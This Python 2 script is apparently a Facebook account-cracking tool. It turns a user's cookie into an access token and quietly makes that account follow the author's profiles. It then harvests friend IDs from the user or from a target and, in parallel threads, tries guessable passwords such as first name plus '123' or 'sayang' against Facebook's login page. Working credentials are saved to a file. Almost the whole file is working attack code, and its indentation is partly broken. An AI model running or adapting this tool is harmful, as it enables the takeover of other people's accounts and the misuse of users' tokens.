#!/usr/bin/python
# -*- coding: utf-8
# Facebook  : Dapunta Khurayra X
# Instagram : ratya.anonym.id

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize,uuid
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
     
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]')]
    
try:
    import requests
except ImportError:
    os.system('pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    
def keluar():
	print ("   [!] Exit")
	os.sys.exit()
		
def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.05)
		
def banner():
    os.system('echo -e "             _______      ________  ___  _______ __\n            / __/ _ )____/ ___/ _ \/ _ |/ ___/ //_/\n           / _// _  /___/ /__/ , _/ __ / /__/ ,< \n          /_/ /____/    \___/_/|_/_/ |_\___/_/|_|\n\n               Coded By : Dapunta Khurayra X\n─────────────────────────────────────────────────────────────" | lolcat')

idmem = []
idfriend = []
idfromfriend = []
back = 0
cekrek = []
threads = []
berhasil = []
emteman = []
emfromfriend = []
cekpoint = []
checkpoint = []
oks = []
id = []
auto_total = []
auto_ok = []
auto_cp = []
auto_run = []
listgrup = []
cekrek = []
vulnot = "\033[31m   Not Vuln"
vuln = "\033[32m   Vuln"

def masuk():
    os.system("clear")
    banner()
    print("\n   [ Choose Login Methode ]")
    print("\n   [1] Login With Token")
    print("   [2] Login With Cookie")
    print("   [0] Exit")
    pilih_masuk()
        
def pilih_masuk():
    sek=raw_input("\n   [•] Choose : ")
    if sek=="":
        print("   [!] Fill In The Correct")
        masuk()
    elif sek=="1":
        tokenz()
    elif sek=="2":
        cookie()
    elif sek=="0":
        keluar()
    else:
        print("   [!] Fill In The Correct")
        masuk()

def tokenz():
    os.system('clear')
    banner()
    toket = raw_input("\n   [•] Token : ")
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        zedd = open('login.txt', 'w')
        zedd.write(toket)
        zedd.close()
        print('\n   [•] Login Successful')
        bot_follow()
    except KeyError:
        print ("   [!] Token Invalid")
        os.system('clear')
        masuk()
		
def log_cookie():
        os.system("clear")
        banner()
        cookie = raw_input("\n   [•] Cookie : ")
        try:
                data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = {
                'user-agent'                : 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', # Jangan Di Ganti Ea Anjink.
                'referer'                   : 'https://m.facebook.com/',
                'host'                      : 'm.facebook.com',
                'origin'                    : 'https://m.facebook.com',
                'upgrade-insecure-requests' : '1',
                'accept-language'           : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                'cache-control'             : 'max-age=0',
                'accept'                    : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'content-type'              : 'text/html; charset=utf-8'
                }, cookies = {
                'cookie'                    : cookie
                })
                find_token = re.search('(EAAA\w+)', data.text)
                hasil    = '\n* Fail : maybe your cookie invalid !!' if (find_token is None) else '\n* Your fb access token : ' + find_token.group(1)
        except requests.exceptions.ConnectionError:
                print "   [!] No Connection"
        cookie = open("login.txt", 'w')
        cookie.write(find_token.group(1))
        cookie.close()
        print("\n   [•] Login Success")
        bot_follow()
        
def bot_follow():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print("\n   [!] Token invalid")
		masuk()
    	requests.post('https://graph.facebook.com/1827084332/subscribers?access_token=' + toket)      #Dapunta Khurayra X
    	requests.post('https://graph.facebook.com/1602590373/subscribers?access_token=' + toket)      #Anthonyus Immanuel
    	requests.post('https://graph.facebook.com/100000729074466/subscribers?access_token=' + toket) #Abigaille Dirgantara
    	requests.post('https://graph.facebook.com/607801156/subscribers?access_token=' + toket)       #Boirah
    	requests.post('https://graph.facebook.com/100009340646547/subscribers?access_token=' + toket) #Anita Zuliatin
    	requests.post('https://graph.facebook.com/100000415317575/subscribers?access_token=' + toket) #Dapunta Xayonara
    	menu()
			
def menu():
	os.system('clear')
	global toket
	try:
		toket = open('login.txt','r').read()
	except IOError:
		print ("   [!] Token Invalid")
		os.system('clear')
		os.system('rm -rf login.txt')
		masuk()
	try:
		otw = requests.get('https://graph.facebook.com/me/?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
		ttl = a['birthday']
	except KeyError:
		os.system('clear')
		print ("   [!] Token Invalid")
		os.system('rm -rf login.txt')
		masuk()
	except requests.exceptions.ConnectionError:
		print ("   [!] No Connection")
		keluar()
	os.system("clear")
	banner()
	print("\n   [•] Hello : "+nama)
	print("   [•] UID   : "+id)
	os.system('echo -e "\n─────────────────────────────────────────────────────────────" | lolcat')
    	print ("\n   [ Choose Options ]")
    	print ("\n   [1] Crack With Manual Pass")
    	print ("   [0] Log Out")
	pilih_menu()

def pilih_menu():
	peak = raw_input("\n   [•] Choose : ")
	if peak =="":
		print("   [!] Fill In The Correct")
		pilih_menu()            
	elif peak =="1"or peak =="01":
		passchoice()
	elif peak =="0" or peak =="00":
		os.system('rm -rf login.txt')
		keluar()
	else:
		print ("   [!] Fill In The Correct")
		pilih_menu()
	print "   [•] Total ID       : "+str(len(id))
	
def passchoice():
	os.system("clear")
	banner()
	print ("\n   [ Choose Target]")
    	print ("\n   [1] Crack From Friendlist")
    	print ("   [2] Crack From Public")
    	print ("   [3] Back To Menu")
	pilih_passxd()
	
def pilih_passxd():
	peak = raw_input("\n   [•] Choose : ")
	if peak =="":
		print ("   [!] Fill In The Correct")
		pilih_passxd()
	elif peak =="1" or peak =="01":
		os.system('clear')
		banner()
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2" or peak =="02":
		os.system('clear')
		banner()
		idt = raw_input("\n   [•] User ID Target : ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			sp = json.loads(pok.text)
			print "   [•] Name           : "+sp["name"]
		except KeyError:
			print ("   [!] Wrong ID Target")
			raw_input("\n   [ Back ]")
			menu()
		except requests.exceptions.ConnectionError:
			print ("   [!] No Connection")
			keluar()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0" or peak =="00":
		menu()
	else:
		print ("   [!] Fill In The Correct")
		passchoice()
	
        print "   [•] Total ID       : "+str(len(id))
    	print ("   [•] Crack Started...\n")
	
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('done')
		except OSError:
			pass
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['first_name'].lower()+'123'
			rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : user, "pass" : pass1, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"})
			xo = rex.content
			if 'mbasic_logout_button' in xo or 'save-device' in xo:
				print '\x1b[0;32m   [OK] '+user+' • '+pass1
				oke = open('done/Indo.txt', 'a')
				oke.write('\n[OK] '+user+' • '+pass1)
				oke.close()
				oks.append(user+pass1)
			else :
				if 'checkpoint' in xo:
					print '\x1b[0;33m   [CP] '+user+' • '+pass1
					cek = open('done/Indo.txt', 'a')
					cek.write('\n[CP] '+user+' • '+pass1)
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['first_name'].lower()+'12345'
					rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : user, "pass" : pass2, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"})
					xo = rex.content
					if 'mbasic_logout_button' in xo or 'save-device' in xo:
						print '\x1b[0;32m   [OK] '+user+' • '+pass2
						oke = open('done/Indo.txt', 'a')
						oke.write('\n[OK] '+user+' • '+pass2)
						oke.close()
						oks.append(user+pass2)
					else:
						if 'checkpoint' in xo:
							print '\x1b[0;33m   [CP] '+user+' • '+pass2
							cek = open('done/Indo.txt', 'a')
							cek.write('\n[CP] '+user+' • '+pass2)
							cek.close()
							cekpoint.append(user+pass2)
                        			else:
							pass3 = b['first_name'].lower()
                            				rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : user, "pass" : pass3, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"})
                            				xo = rex.content
                            				if 'mbasic_logout_button' in xo or 'save-device' in xo:
                                				print '\x1b[0;32m   [OK] '+user+' • '+pass3
                                				oke = open('done/Indo.txt', 'a')
                                				oke.write('\n[OK] '+user+' • '+pass3)
                                				oke.close()
                                				oks.append(user+pass3)
                            				else:
                                				if 'checkpoint' in xo:
                                    					print '\x1b[0;33m   [CP] '+user+' • '+pass3
                                    					cek = open('done/Indo.txt', 'a')
                                    					cek.write('\n[CP] '+user+' • '+pass3)
                                    					cek.close()
                                    					cekpoint.append(user+pass3)
                                				else:
									pass4 = 'sayang'
                                    					rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : user, "pass" : pass4, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"})
                                    					xo = rex.content
                                    					if 'mbasic_logout_button' in xo or 'save-device' in xo:
                                        					print '\x1b[0;32m   [OK] '+user+' • '+pass4
                                        					oke = open('done/Indo.txt', 'a')
										oke.write('\n[OK] '+user+' • '+pass4)
                                        					oke.close()
                                        					oks.append(user+pass4)
                                    					else:
                                        					if 'checkpoint' in xo:
                                            						print '\x1b[0;33m   [CP] '+user+' • '+pass4
                                            						cek = open('done/Indo.txt', 'a')
                                            						cek.write('\n[CP] '+user+' • '+pass4)
                                            						cek.close()
                                            						cekpoint.append(user+pass4)
        	except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print ("\n   [•] Crack Finished")
	print "   [•] Total OK/CP: "+str(len(oks))+"/"+str(len(cekpoint))
	print ("   [•] File Saved At : done/Indo.txt")
	raw_input("   [ Back ]")
	os.system("python2 crackfb3.py")
	menu()
			
if __name__ == '__main__':
	menu() 
